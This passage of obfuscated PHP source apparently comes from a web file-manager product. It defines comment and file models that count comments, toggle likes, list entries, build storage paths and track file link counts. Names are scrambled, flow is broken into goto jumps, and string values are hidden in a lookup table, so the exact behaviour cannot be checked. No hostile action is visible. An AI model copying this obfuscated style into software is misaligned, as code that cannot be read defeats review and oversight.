$_SERVER[Æ¼ôºÙï]; if ($GLOBALS[$CÎÆ»ëÂô[6]][$CÎÆ»ëÂô[87]][$CÎÆ»ëÂô[1688]] != $CÎÆ»ëÂô[86]) { return !0; } $A´ÃæÙ‡¿É = $this->config(); goto eºéÚóìÓç; F…’î•Ìšì: } public function process() { $Bå¸äã¥Ñì =& $_SERVER[Æ¼ôºÙï]; return array($Bå¸äã¥Ñì[713] => Task::get($Bå¸äã¥Ñì[731]), $Bå¸äã¥Ñì[716] => Task::get($Bå¸äã¥Ñì[748]), $Bå¸äã¥Ñì[173] => Task::get($Bå¸äã¥Ñì[755])); } public function restore() { $BÒµ„ÖÇÇš =& $_SERVER[Æ¼ôºÙï]; ActionCall($BÒµ„ÖÇÇš[997], !0, 1); ActionCall($BÒµ„ÖÇÇš[997], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\x6f\x6d\x6d\145\x6e\x74"; protected $tableMeta = array("\164\141\x62\154\145\116\x61\155\x65" => "\x63\157\x6d\155\145\x6e\x74\137\155\x65\164\x61", "\x6d\x65\164\x61\x46\x69\145\154\144" => "\143\x6f\155\155\x65\x6e\164\x49\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($b‘ÍÍ¡öŠÄ) { $CàèÖ¦Õ‹ =& $_SERVER[Æ¼ôºÙï]; if ($b‘ÍÍ¡öŠÄ[$CàèÖ¦Õ‹[1689]]) { $eäõæ•­õ = $this->where(array($CàèÖ¦Õ‹[1690] => $b‘ÍÍ¡öŠÄ[$CàèÖ¦Õ‹[1689]]))->find(); if (!$eäõæ•­õ || $eäõæ•­õ[$CàèÖ¦Õ‹[389]] != $b‘ÍÍ¡öŠÄ[$CàèÖ¦Õ‹[389]] || $eäõæ•­õ[$CàèÖ¦Õ‹[474]] != $b‘ÍÍ¡öŠÄ[$CàèÖ¦Õ‹[474]]) { return !1; } $this->where(array($CàèÖ¦Õ‹[1690] => $b‘ÍÍ¡öŠÄ[$CàèÖ¦Õ‹[1689]]))->setAdd($CàèÖ¦Õ‹[1691], 1); } $b‘ÍÍ¡öŠÄ[$CàèÖ¦Õ‹[1692]] = 0; $b‘ÍÍ¡öŠÄ[$CàèÖ¦Õ‹[1691]] = 0; $b‘ÍÍ¡öŠÄ[$CàèÖ¦Õ‹[708]] = 1; return $this->add($b‘ÍÍ¡öŠÄ); } public function commentCount($CôÃ–Ø„·Ó, $dÕÈ¯æË) { goto Cµ¼Ğ‚š¢ô; fó£¯ÛŞòÊ: return array_to_keyvalue($D…²ğßÇÕØ, $BÌ¦à‰æˆˆ[474], $BÌ¦à‰æˆˆ[1694]); goto aŠÒåŠ àÂ; Cµ¼Ğ‚š¢ô: $BÌ¦à‰æˆˆ =& $_SERVER[Æ¼ôºÙï]; if (!$CôÃ–Ø„·Ó) { return array(); } if (is_string($CôÃ–Ø„·Ó) || is_int($CôÃ–Ø„·Ó)) { $CôÃ–Ø„·Ó = array($CôÃ–Ø„·Ó); } goto eùç¿ŠÍŸé; eùç¿ŠÍŸé: $bˆ³ğƒÎƒ = $BÌ¦à‰æˆˆ[1693]; $B“È¡Î–† = array($BÌ¦à‰æˆˆ[474] => array($BÌ¦à‰æˆˆ[7], $CôÃ–Ø„·Ó), $BÌ¦à‰æˆˆ[389] => $dÕÈ¯æË); $D…²ğßÇÕØ = $this->field($bˆ³ğƒÎƒ)->where($B“È¡Î–†)->group($BÌ¦à‰æˆˆ[474])->select(); goto fó£¯ÛŞòÊ; aŠÒåŠ àÂ: } public function remove($c¥¯“ÒõË) { $BÑĞ…ÉÕšÇ =& $_SERVER[Æ¼ôºÙï]; $dˆ’Í÷Ü½¿ = array($BÑĞ…ÉÕšÇ[1690] => $c¥¯“ÒõË); $e‘˜Ü…¸ŸÁ = $this->where($dˆ’Í÷Ü½¿)->find(); if ($e‘˜Ü…¸ŸÁ[$BÑĞ…ÉÕšÇ[1689]]) { $this->where(array($BÑĞ…ÉÕšÇ[1690] => $e‘˜Ü…¸ŸÁ[$BÑĞ…ÉÕšÇ[1689]]))->setAdd($BÑĞ…ÉÕšÇ[1691], -1); } return $this->where($dˆ’Í÷Ü½¿)->delete(); } public function edit($e·ÎÑÊÇ¥Œ, $a‰–ó´ö°º) { $föóƒ„‚¢± =& $_SERVER[Æ¼ôºÙï]; $dî ·§–ø„ = array($föóƒ„‚¢±[1690] => $e·ÎÑÊÇ¥Œ); return $this->where($dî ·§–ø„)->save(array($föóƒ„‚¢±[1695] => $a‰–ó´ö°º)); } public function prasise($Cê©˜³Ç˜Û) { $e Ô¦ÒÉ´‚ =& $_SERVER[Æ¼ôºÙï]; $DÈŠ¾éÎÀš = Model($e Ô¦ÒÉ´‚[1696]); $fŠôÏ¿áŞŞ = array($e Ô¦ÒÉ´‚[1690] => $Cê©˜³Ç˜Û, $e Ô¦ÒÉ´‚[1494] => USER_ID); $AÌé§ˆªÃ = $DÈŠ¾éÎÀš->where($fŠôÏ¿áŞŞ)->find(); if (!$AÌé§ˆªÃ) { $DÈŠ¾éÎÀš->add($fŠôÏ¿áŞŞ); $f÷×§ñ”ôç = $this->where(array($e Ô¦ÒÉ´‚[1690] => $Cê©˜³Ç˜Û))->setAdd($e Ô¦ÒÉ´‚[1692], 1); } else { $DÈŠ¾éÎÀš->where($fŠôÏ¿áŞŞ)->delete(); $f÷×§ñ”ôç = $this->where(array($e Ô¦ÒÉ´‚[1690] => $Cê©˜³Ç˜Û))->setAdd($e Ô¦ÒÉ´‚[1692], -1); } return $f÷×§ñ”ôç; } public function targetInfo($D¢–ÙÙô¼, $aùÌÎ¨äß‡) { goto Fî£Ğ‡®¥®; BÒ¨Á¢Áùâ: $E²£é²Ä…í = "\122\111\x47\110\124\40\112\x4f\111\x4e\40{$this->tablePrefix}\143\x6f\155\x6d\x65\156\164\137\x70\x72\x61\x69\163\145\x20\x73\164\141\162\x20\157\x6e\x20\x63\x6f\155\x6d\x65\x6e\164\x2e\x63\x6f\155\x6d\145\156\x74\x49\x44\40\75\40\x73\164\141\162\x2e\143\157\155\155\x65\x6e\164\x49\x44"; $C¢¡–²”Ì° = $this->alias($CÙ°Ôåí‡Ì[350])->where($c‰›ğ‘Ú–¶)->join($E²£é²Ä…í, $CÙ°Ôåí‡Ì[1697])->count(); $Eß¨ĞêÇšº = array($CÙ°Ôåí‡Ì[1698] => $eĞÛô¿áÍ×, $CÙ°Ôåí‡Ì[1699] => $C¢¡–²”Ì°); goto CŒéœ‹—“‘; CŒéœ‹—“‘: return $Eß¨ĞêÇšº; goto eØ‡…ã¬‡; Fî£Ğ‡®¥®: $CÙ°Ôåí‡Ì =& $_SERVER[Æ¼ôºÙï]; $c‰›ğ‘Ú–¶ = array($CÙ°Ôåí‡Ì[538] => $D¢–ÙÙô¼, $CÙ°Ôåí‡Ì[539] => $aùÌÎ¨äß‡); $eĞÛô¿áÍ× = $this->where($c‰›ğ‘Ú–¶)->count(); goto BÒ¨Á¢Áùâ; eØ‡…ã¬‡: } public function listData($c×†—Ş®„Š) { $CÚ°Åæò =& $_SERVER[Æ¼ôºÙï]; if (isset($c×†—Ş®„Š[$CÚ°Åæò[1700]])) { if ($c×†—Ş®„Š[$CÚ°Åæò[1700]]) { $c×†—Ş®„Š[$CÚ°Åæò[1701]] = array($CÚ°Åæò[950], intval($c×†—Ş®„Š[$CÚ°Åæò[1700]])); } unset($c×†—Ş®„Š[$CÚ°Åæò[1700]]); } if (isset($c×†—Ş®„Š[$CÚ°Åæò[1702]])) { if ($c×†—Ş®„Š[$CÚ°Åæò[1702]]) { $c×†—Ş®„Š[$CÚ°Åæò[1701]] = array($CÚ°Åæò[947], intval($c×†—Ş®„Š[$CÚ°Åæò[1702]])); } unset($c×†—Ş®„Š[$CÚ°Åæò[1702]]); } return $this->_listData($c×†—Ş®„Š); } private function _listData($EŠç¯ëèÄ) { $CñÅ¥ø•è¸ =& $_SERVER[Æ¼ôºÙï]; $aáàŸ™õ¨– = $this->where($EŠç¯ëèÄ)->_makeOrder()->selectPage(100); $this->_listAppendParent($aáàŸ™õ¨–[$CñÅ¥ø•è¸[363]]); $this->_listAppendUser($aáàŸ™õ¨–[$CñÅ¥ø•è¸[363]]); $this->_listAppendMeta($aáàŸ™õ¨–[$CñÅ¥ø•è¸[363]]); return $aáàŸ™õ¨–; } private function _makeOrder() { $båñö’ùÁ =& $_SERVER[Æ¼ôºÙï]; $CöëàòÕÆ = array($båñö’ùÁ[1692], $båñö’ùÁ[1691], $båñö’ùÁ[192]); $b¡¹¥ëø×Ó = Input::get($båñö’ùÁ[424], $båñö’ùÁ[7], $båñö’ùÁ[407], $CöëàòÕÆ); $DˆË™ÈÊ‡Ÿ = Input::get($båñö’ùÁ[425], $båñö’ùÁ[7], $båñö’ùÁ[1496], array($båñö’ùÁ[1703], $båñö’ùÁ[422])); $AòÈ‹™êƒŠ = $b¡¹¥ëø×Ó . $båñö’ùÁ[50] . $DˆË™ÈÊ‡Ÿ; return $this->order($AòÈ‹™êƒŠ); } private function _listAppendParent(&$bĞºÆÒÎõ‹) { goto B¯ÕÂë×‰Ô; B¯ÕÂë×‰Ô: $E¤ˆÂ³‰ß =& $_SERVER[Æ¼ôºÙï]; $FŠ‹›Š¼Úà = array_unique(array_to_keyvalue($bĞºÆÒÎõ‹, $E¤ˆÂ³‰ß[33], $E¤ˆÂ³‰ß[1689])); $FŠ‹›Š¼Úà = array_remove_value($FŠ‹›Š¼Úà, $E¤ˆÂ³‰ß[486]); goto f¾ÉñìÕÀ§; f¾ÉñìÕÀ§: if (!$FŠ‹›Š¼Úà) { return; } $EÚ¥‰ÏÈ‹‰ = $this->where(array($E¤ˆÂ³‰ß[1690] => array($E¤ˆÂ³‰ß[7], $FŠ‹›Š¼Úà)))->select(); $EÚ¥‰ÏÈ‹‰ = array_to_keyvalue($EÚ¥‰ÏÈ‹‰, $E¤ˆÂ³‰ß[1701]); goto fİº‹ÚÆ²á; fİº‹ÚÆ²á: foreach ($bĞºÆÒÎõ‹ as &$A—Öğ”¡) { if (isset($EÚ¥‰ÏÈ‹‰[$A—Öğ”¡[$E¤ˆÂ³‰ß[1689]]])) { $A—Öğ”¡[$E¤ˆÂ³‰ß[1704]] = $EÚ¥‰ÏÈ‹‰[$A—Öğ”¡[$E¤ˆÂ³‰ß[1689]]]; } } unset($A—Öğ”¡); goto dÑÑè‡Ş×Ù; dÑÑè‡Ş×Ù: } private function _listAppendUser(&$FŞ¿˜¶¼•) { goto a¿É„µ‹µõ; BšŞÀ„Èâˆ: foreach ($FŞ¿˜¶¼• as &$cÆé ‰‘ÁÌ) { $cÆé ‰‘ÁÌ[$Dàø™…„Ä“[551]] = $bÕ¯âù‰Äö[$cÆé ‰‘ÁÌ[$Dàø™…„Ä“[1502]]]; if (isset($cÆé ‰‘ÁÌ[$Dàø™…„Ä“[1704]])) { $cÆé ‰‘ÁÌ[$Dàø™…„Ä“[1704]][$Dàø™…„Ä“[551]] = $bÕ¯âù‰Äö[$cÆé ‰‘ÁÌ[$Dàø™…„Ä“[1704]][$Dàø™…„Ä“[1502]]]; } } unset($cÆé ‰‘ÁÌ); goto AÖÂ”¾¢£¢; a¿É„µ‹µõ: $Dàø™…„Ä“ =& $_SERVER[Æ¼ôºÙï]; $EŠÇ¤×†ï© = array_unique(array_to_keyvalue($FŞ¿˜¶¼•, $Dàø™…„Ä“[33], $Dàø™…„Ä“[1502])); $EŠÇ¤×†ï© = array_remove_value($EŠÇ¤×†ï©, $Dàø™…„Ä“[486]); goto E¯áË¬ÊÂš; E¯áË¬ÊÂš: if (count($EŠÇ¤×†ï©) == 0) { return; } foreach ($FŞ¿˜¶¼• as $cÆé ‰‘ÁÌ) { if (isset($cÆé ‰‘ÁÌ[$Dàø™…„Ä“[1704]])) { $EŠÇ¤×†ï©[] = $cÆé ‰‘ÁÌ[$Dàø™…„Ä“[1704]][$Dàø™…„Ä“[1502]]; } } $bÕ¯âù‰Äö = Model($Dàø™…„Ä“[495])->userListInfo($EŠÇ¤×†ï©); goto BšŞÀ„Èâˆ; AÖÂ”¾¢£¢: } private function _listAppendMeta(&$d¶ùÌ¤Ä–) { goto Aà½ª–š…‘; E’Ò÷—ƒ©ç: if (!$e²”è¢‰ä) { return !1; } foreach ($d¶ùÌ¤Ä– as &$c¦¹Î°µë) { $c¦¹Î°µë[$FÉñë²¦[434]] = $e²”è¢‰ä[$c¦¹Î°µë[$FÉñë²¦[1701]]]; if (isset($c¦¹Î°µë[$FÉñë²¦[1704]])) { $c¦¹Î°µë[$FÉñë²¦[1704]][$FÉñë²¦[434]] = $e²”è¢‰ä[$c¦¹Î°µë[$FÉñë²¦[1704]][$FÉñë²¦[1701]]]; } } unset($c¦¹Î°µë); goto f¬ƒïäÖ¢±; Aà½ª–š…‘: $FÉñë²¦ =& $_SERVER[Æ¼ôºÙï]; $a®Æö’¨ = array_unique(array_to_keyvalue($d¶ùÌ¤Ä–, $FÉñë²¦[33], $FÉñë²¦[1701])); $a®Æö’¨ = array_remove_value($a®Æö’¨, $FÉñë²¦[486]); goto c–¦È©ËîÀ; c–¦È©ËîÀ: if (!$a®Æö’¨) { return; } foreach ($d¶ùÌ¤Ä– as $c¦¹Î°µë) { if (isset($c¦¹Î°µë[$FÉñë²¦[1704]])) { $a®Æö’¨[] = $c¦¹Î°µë[$FÉñë²¦[1704]][$FÉñë²¦[1701]]; } } $e²”è¢‰ä = $this->metaList($a®Æö’¨); goto E’Ò÷—ƒ©ç; f¬ƒïäÖ¢±: } private function metaList($d·»Ã“ä) { goto b×‘àÄóÅ; B²Á—á¸ Ü: $d÷Ûä×í’ = Model($bÍî×…–Ê[1705])->where($c–Š‡ØİŠ‹)->select(); $d÷Ûä×í’ = array_to_keyvalue_group($d÷Ûä×í’, $bÍî×…–Ê[1701]); foreach ($d÷Ûä×í’ as $eÏ‡Š‚¤é¶ => $a—Ì”ÄĞÒ) { $c×¿ƒ«Ÿ†À = array(); foreach ($a—Ì”ÄĞÒ as $fÁ”ó³ÛñØ) { $c×¿ƒ«Ÿ†À[$fÁ”ó³ÛñØ[$bÍî×…–Ê[92]]] = $fÁ”ó³ÛñØ[$bÍî×…–Ê[368]]; } $d÷Ûä×í’[$eÏ‡Š‚¤é¶] = $c×¿ƒ«Ÿ†À; } goto f¡ÓÍÎ‘‰•; b×‘àÄóÅ: $bÍî×…–Ê =& $_SERVER[Æ¼ôºÙï]; if (!$d·»Ã“ä) { return array(); } $c–Š‡ØİŠ‹ = array($bÍî×…–Ê[1701] => array($bÍî×…–Ê[7], $d·»Ã“ä)); goto B²Á—á¸ Ü; f¡ÓÍÎ‘‰•: return $d÷Ûä×í’ ? $d÷Ûä×í’ : array(); goto EŸÂ‰²´êÇ; EŸÂ‰²´êÇ: } } class FileModel extends ModelBase { protected $tableName = "\151\x6f\x5f\146\151\x6c\x65"; protected $tableMeta = array("\164\141\142\x6c\145\x4e\141\155\x65" => "\151\x6f\137\146\x69\x6c\145\x5f\155\145\164\141", "\x6d\145\164\141\106\151\x65\x6c\144" => "\x66\151\154\145\x49\x44"); public function fileInfo($EËòœ¡¼Õë) { $D‹ÀÊÄñÍ =& $_SERVER[Æ¼ôºÙï]; static $a…–ğ÷Ü·¹ = array(); if (!isset($a…–ğ÷Ü·¹[$EËòœ¡¼Õë])) { $AŞµçÛÅ¼Œ = $D‹ÀÊÄñÍ[1706]; $Dä‘®İ‰ = Model($D‹ÀÊÄñÍ[439])->field($AŞµçÛÅ¼Œ)->where(array($D‹ÀÊÄñÍ[437] => $EËòœ¡¼Õë))->find(); $a…–ğ÷Ü·¹[$EËòœ¡¼Õë] = $Dä‘®İ‰; } return $a…–ğ÷Ü·¹[$EËòœ¡¼Õë]; } public function addFileByContent($CÃ¤¶¹‹ = '', $FÇƒß‘¸Ô = '') { goto c›ÎŠÂÄãÌ; EøÓÁŒ¤£¨: $F±²š“ˆºˆ = $eÍ¤ÚÅæ„› . $BŸÒì¸¤Šé[1708] . rand_string(16); file_put_contents($F±²š“ˆºˆ, $CÃ¤¶¹‹); $Dİ›¡í©— = $this->addFile($F±²š“ˆºˆ, $FÇƒß‘¸Ô, !0); goto cÚÃ¯Òˆ¤‘; cÚÃ¯Òˆ¤‘: if (file_exists($F±²š“ˆºˆ)) { @unlink($F±²š“ˆºˆ); } return $Dİ›¡í©—; goto Cí°å¼„³; c›ÎŠÂÄãÌ: $BŸÒì¸¤Šé =& $_SERVER[Æ¼ôºÙï]; $eÍ¤ÚÅæ„› = TEMP_PATH . $BŸÒì¸¤Šé[1707]; if (!is_dir($eÍ¤ÚÅæ„›)) { mk_dir($eÍ¤ÚÅæ„›); } goto EøÓÁŒ¤£¨; Cí°å¼„³: } public function createFileName($bš›İ‡ªÖÀ) { goto fô°ÕŸë¿¸; c¶ÕâÄÀ¹Ê: $b¹‰Âš¥Ë = $DÉ“ŠÔ«Å¦->pathFather($Bà·ŸÎÙæƒ); static $F«¯š¬Ú¢Ì = false; $bõáò¶®‡õ = $AŠ’ù‹¸âÆ[1709] . md5($b¹‰Âš¥Ë); goto FÕ»Â‰äœ„; FÕ»Â‰äœ„: if (!$F«¯š¬Ú¢Ì && !Cache::get($bõáò¶®‡õ)) { $F«¯š¬Ú¢Ì = !0; $FøÖæ’İÎó = IO::mkdir($b¹‰Âš¥Ë); if (!IO::exist($FøÖæ’İÎó . $AŠ’ù‹¸âÆ[1710])) { IO::mkfile($FøÖæ’İÎó . $AŠ’ù‹¸âÆ[1710]); } Cache::set($bõáò¶®‡õ, 1, 3600 * 2); } return $Bà·ŸÎÙæƒ; goto dÊÑßŠ•; fô°ÕŸë¿¸: $AŠ’ù‹¸âÆ =& $_SERVER[Æ¼ôºÙï]; $DÉ“ŠÔ«Å¦ = IO::init($AŠ’ù‹¸âÆ[8]); $Bà·ŸÎÙæƒ = $this->makeFilePath($bš›İ‡ªÖÀ, $DÉ“ŠÔ«Å¦); goto c¶ÕâÄÀ¹Ê; dÊÑßŠ•: } public function makeFilePath($eÃé£‘»ô¦, $b¾›¤æ•¿æ) { goto Bº”à‰…¡Ú; d•µ‘÷¦£: switch ($AÛÓ›œ¦æ‡) { case $dœĞŒó¾Ïß[1714]: $C¯İìøÁáÎ = $C¯İìøÁáÎ . $dœĞŒó¾Ïß[94] . $b¾›¤æ•¿æ->ext($eÃé£‘»ô¦); if ($b¾›¤æ•¿æ->ext($eÃé£‘»ô¦) == $dœĞŒó¾Ïß[1651]) { $C¯İìøÁáÎ .= $dœĞŒó¾Ïß[1403]; } break; case $dœĞŒó¾Ïß[1715]: goto FØ—µõÂ…¬; Dˆ°ì¾È³É: CacheLock::lock($c÷äåëÎæî); $dÈ¸ÁğÉÍ = IO::fileNameAuto($DĞâ·¼‚‹Ğ, $eÃé£‘»ô¦); $C¯İìøÁáÎ = $DĞâ·¼‚‹Ğ . $dÈ¸ÁğÉÍ; goto e§‚µèÖŞ²; féÌ™–ĞŞ: $DĞâ·¼‚‹Ğ = $dœĞŒó¾Ïß[1101] . $FãÓ‡È²Ü[$dœĞŒó¾Ïß[385]] . $dœĞŒó¾Ïß[1717] . date($dœĞŒó¾Ïß[1718]) . $a„—¿İˆ™» . $dœĞŒó¾Ïß[8]; if ($b¾›¤æ•¿æ->ext($eÃé£‘»ô¦) == $dœĞŒó¾Ïß[1651]) { $eÃé£‘»ô¦ .= $dœĞŒó¾Ïß[1403]; } $c÷äåëÎæî = $dœĞŒó¾Ïß[1719] . $DĞâ·¼‚‹Ğ . $eÃé£‘»ô¦; goto Dˆ°ì¾È³É; FØ—µõÂ…¬: $B·Á¿’Œ = Model($dœĞŒó¾Ïß[1103])->get($dœĞŒó¾Ïß[1399]); $a„—¿İˆ™» = substr(md5($dœĞŒó¾Ïß[1716] . $B·Á¿’Œ . date($dœĞŒó¾Ïß[706])), 0, 8); $FãÓ‡È²Ü = KodIO::defaultDriver(); goto féÌ™–ĞŞ; e§‚µèÖŞ²: if (IO::isTypeObject($C¯İìøÁáÎ) && !IO::isUploadServer($C¯İìøÁáÎ)) { $a­ï£¯¥§Š = IO::setContent($C¯İìøÁáÎ, $dœĞŒó¾Ïß[33]); if (!$a­ï£¯¥§Š) { show_json($dœĞŒó¾Ïß[1720], !1); } } CacheLock::unlock($c÷äåëÎæî); break; goto B†Ñ‚·ôàê; B†Ñ‚·ôàê: case $dœĞŒó¾Ïß[1713]: break; default: break; } return $C¯İìøÁáÎ; goto e„éŞßÂ£­; b¤ÅÏ·°ÆÚ: $C¯İìøÁáÎ = $DĞâ·¼‚‹Ğ . rand_string(5) . short_id(100); $eÃé£‘»ô¦ = str_replace($dœĞŒó¾Ïß[8], $dœĞŒó¾Ïß[70], KodIO::clear($eÃé£‘»ô¦)); if (!$eÃé£‘»ô¦) { $AÛÓ›œ¦æ‡ = $dœĞŒó¾Ïß[1713]; } goto d•µ‘÷¦£; Bº”à‰…¡Ú: $dœĞŒó¾Ïß =& $_SERVER[Æ¼ôºÙï]; $AÛÓ›œ¦æ‡ = Model($dœĞŒó¾Ïß[1103])->get($dœĞŒó¾Ïß[1711]); $DĞâ·¼‚‹Ğ = KodIO::defaultIO() . date($dœĞŒó¾Ïß[1712]); goto b¤ÅÏ·°ÆÚ; e„éŞßÂ£­: } public function addFileByRemote($C„¨ƒØÓÊ•, $cï»Ôù¿åÏ, $aÅÅÚå¹ç¦ = array()) { goto eÂËÍõÒ“À; eÂËÍõÒ“À: $EÅ›Æçà˜á =& $_SERVER[Æ¼ôºÙï]; if (!IO::exist($C„¨ƒØÓÊ•)) { return !1; } $A‹À×è‘İ = $aÅÅÚå¹ç¦[$EÅ›Æçà˜á[169]] ? $aÅÅÚå¹ç¦[$EÅ›Æçà˜á[169]] : $EÅ›Æçà˜á[33]; goto c“ñÕØº»Ä; F»¡ß âŠ«: if ($FØœ´Ê¸– = $this->addFileCheckExist($d×›Ãñ²[$EÅ›Æçà˜á[170]], $d×›Ãñ²[$EÅ›Æçà˜á[169]], $d×›Ãñ²[$EÅ›Æçà˜á[77]])) { return $FØœ´Ê¸–; } return $this->addFileData($d×›Ãñ²); goto Cİğ©òñÕ; c“ñÕØº»Ä: $Aâ¸ËÇŠ× = IO::hashMd5($C„¨ƒØÓÊ•, $A‹À×è‘İ); $EÎ™ƒ¯ËÓ­ = KodIO::defaultDriver(); $d×›Ãñ² = array($EÅ›Æçà˜á[537] => IO::size($C„¨ƒØÓÊ•), $EÅ›Æçà˜á[1721] => 1, $EÅ›Æçà˜á[404] => $cï»Ôù¿åÏ, $EÅ›Æçà˜á[754] => $EÎ™ƒ¯ËÓ­[$EÅ›Æçà˜á[385]], $EÅ›Æçà˜á[405] => $C„¨ƒØÓÊ•, $EÅ›Æçà˜á[1722] => $aÅÅÚå¹ç¦[$EÅ›Æçà˜á[170]] ? $aÅÅÚå¹ç¦[$EÅ›Æçà˜á[170]] : IO::hashSimple($C„¨ƒØÓÊ•), $EÅ›Æçà˜á[1723] => $Aâ¸ËÇŠ× ? $Aâ¸ËÇŠ× : $A‹À×è‘İ); goto F»¡ß âŠ«; Cİğ©òñÕ: } private function addFileData($Dâºö¿òö) { $fÒùåÂ¶î« =& $_SERVER[Æ¼ôºÙï]; if (!$Dâºö¿òö) { return !1; } $Dâºö¿òö[$fÒùåÂ¶î«[77]] = intval($Dâºö¿òö[$fÒùåÂ¶î«[77]]); if (!$Dâºö¿òö[$fÒùåÂ¶î«[77]] && strlen($Dâºö¿òö[$fÒùåÂ¶î«[170]]) > 32) { $Dâºö¿òö[$fÒùåÂ¶î«[77]] = intval(substr($Dâºö¿òö[$fÒùåÂ¶î«[170]], 32)); } $f­ƒÀÛ™ã† = $this->add($Dâºö¿òö); return $this->find($f­ƒÀÛ™ã†); } public function addFile($c»Ö¸¤¹Œ, $a¿ó»¸“œ”, $aÎÑâ™Ğğ› = false) { goto aÒ‡‹’¶; DÔø¤÷Ùš’: return $DÏÈ‘Şš‹Ô; goto BÑ—¤óŸÚ§; aìÎà„·ë¦: $C’½»ßªîÔ = $_SERVER[Æ¼ôºÙï][1724] . $Dîœø¬óë; CacheLock::lock($C’½»ßªîÔ); if ($aÑ‚ê“–‡ = $this->addFileCheckExist($D…®éÍ†ù, $Dîœø¬óë, $E”ášÔìÆÖ)) { CacheLock::unlock($C’½»ßªîÔ); return $aÑ‚ê“–‡; } goto Cñ…Í˜¼òÌ; aÒ‡‹’¶: $D…®éÍ†ù = IO::hashSimple($c»Ö¸¤¹Œ); $Dîœø¬óë = IO::hashMd5($c»Ö¸¤¹Œ); $E”ášÔìÆÖ = IO::size($c»Ö¸¤¹Œ); goto aìÎà„·ë¦; Cñ…Í˜¼òÌ: $a¦¨Àçª = $this->addFileMake($c»Ö¸¤¹Œ, $E”ášÔìÆÖ, $D…®éÍ†ù, $Dîœø¬óë, $a¿ó»¸“œ”, $aÎÑâ™Ğğ›); $DÏÈ‘Şš‹Ô = $this->addFileData($a¦¨Àçª); CacheLock::unlock($C’½»ßªîÔ); goto DÔø¤÷Ùš’; BÑ—¤óŸÚ§: } public function addFileMake($cõØôÇ´Ğè, $Eß¸ÓŒ Úœ, $eáŠ³„İÆ, $d»¾Ğ°‡×é, $F²°«Š»Æù, $a¢¿‘–¹ÅÏ) { goto e¢’Æ¿Òà; e¢’Æ¿Òà: $F²¦—ô«ÄŠ =& $_SERVER[Æ¼ôºÙï]; $a¤¨óõ á = $this->createFileName($F²°«Š»Æù); $CËë‰Ğ¬Úæ = get_path_father($a¤¨óõ á); goto c£‚ñ¬ßÛÀ; c£‚ñ¬ßÛÀ: $e¥—òá×èÑ = get_path_this($a¤¨óõ á); if ($a¢¿‘–¹ÅÏ) { $E¶’”¢Œßº = IO::move($cõØôÇ´Ğè, $CËë‰Ğ¬Úæ, !1, $e¥—òá×èÑ); } else { $E¶’”¢Œßº = IO::copy($cõØôÇ´Ğè, $CËë‰Ğ¬Úæ, !1, $e¥—òá×èÑ); } if (!$E¶’”¢Œßº) { return !1; } goto E‚œ’¸‚Áâ; E‚œ’¸‚Áâ: $BØ·³İõ¡Ó = KodIO::defaultDriver(); $A®ˆç˜ˆÁ” = array($F²¦—ô«ÄŠ[537] => $Eß¸ÓŒ Úœ, $F²¦—ô«ÄŠ[1721] => 1, $F²¦—ô«ÄŠ[404] => $F²°«Š»Æù, $F²¦—ô«ÄŠ[754] => $BØ·³İõ¡Ó[$F²¦—ô«ÄŠ[385]], $F²¦—ô«ÄŠ[405] => $a¤¨óõ á, $F²¦—ô«ÄŠ[1722] => $eáŠ³„İÆ, $F²¦—ô«ÄŠ[1723] => $d»¾Ğ°‡×é); return $A®ˆç˜ˆÁ”; goto cîÂï„Èğœ; cîÂï„Èğœ: } public function addFileCheckExist($B¯óİŞ‡“’, $EÔ“Ùóœ«Ò, $c†™ææ¼Í) { $B¶­¡ƒó× =& $_SERVER[Æ¼ôºÙï]; $CĞ×£ƒªîğ = $this->findByHash($B¯óİŞ‡“’, $EÔ“Ùóœ«Ò); if (!$CĞ×£ƒªîğ) { return !1; } $aÜ»Å×¹Ó¬ = array($B¶­¡ƒó×[1721] => intval($CĞ×£ƒªîğ[$B¶­¡ƒó×[1725]]) + 1, $B¶­¡ƒó×[537] => $c†™ææ¼Í); $this->where(array($B¶­¡ƒó×[437] => $CĞ×£ƒªîğ[$B¶­¡ƒó×[436]]))->save($aÜ»Å×¹Ó¬); return $CĞ×£ƒªîğ; } public function remove($BöŞÎÖí¼©) { $this->linkCountChange($BöŞÎÖí¼©, !1); $this->clearEmpty(); return !0; } public function linkAdd($b«ƒ‘‹®») { $this->linkCountChange($b«ƒ‘‹®», !0); } public function linkCountChange($bÊœ¯’ˆ†ª, $A¦Ô¸‚¤‰¼) { goto Då¥ï¨µ¹†; E¼òÈÊ¯±‚: foreach ($cßòÚööî˜ as $e¥¢Ğò˜ => $D˜øÚöÙ‹™) { $cœ¶“¢´ = $D˜øÚöÙ‹™ . $EñÂ˜¿ˆ†[33]; if (!$D‘—‚†õÎè[$cœ¶“¢´]) { $D‘—‚†õÎè[$cœ¶“¢´] = array(); } $D‘—‚†õÎè[$cœ¶“¢´][] = $e¥¢Ğò˜; } foreach ($D‘—‚†õÎè as $D˜øÚöÙ‹™ => $aÌ²àæ³ñ´) { if (!$aÌ²àæ³ñ´) { continue; } $D˜øÚöÙ‹™ = $A¦Ô¸‚¤‰¼ ? $D˜øÚöÙ‹™ : -intval($D˜øÚöÙ‹™); $F÷Í¾¶³Ö¡ = array($EñÂ˜¿ˆ†[436] => array($EñÂ˜¿ˆ†[7], $aÌ²àæ³ñ´)); if ($D˜øÚöÙ‹™ < 0) { $F÷Í¾¶³Ö¡[$EñÂ˜¿ˆ†[1725]] = array($EñÂ˜¿ˆ†[951], abs($D˜øÚöÙ‹™)); } $this->where($F÷Í¾¶³Ö¡)->setAdd($EñÂ˜¿ˆ†[1725], $D˜øÚöÙ‹™); } goto cìï¼ñ†Ö; Då¥ï¨µ¹†: $EñÂ˜¿ˆ† =& $_SERVER[Æ¼ôºÙï]; if (!$bÊœ¯’ˆ†ª) { return; } if (!is_array($bÊœ¯’ˆ†ª)) { $bÊœ¯’ˆ†ª = array($bÊœ¯’ˆ†ª); } goto D¯…¯Ü¿‹; D¯…¯Ü¿‹: $cßòÚööî˜ = array(); foreach ($bÊœ¯’ˆ†ª as $e¥¢Ğò˜) { $cœ¶“¢´ = $e¥¢Ğò˜ . $EñÂ˜¿ˆ†[33]; if (!$cßòÚööî˜[$cœ¶“¢´]) { $cßòÚööî˜[$cœ¶“¢´] = 0; } 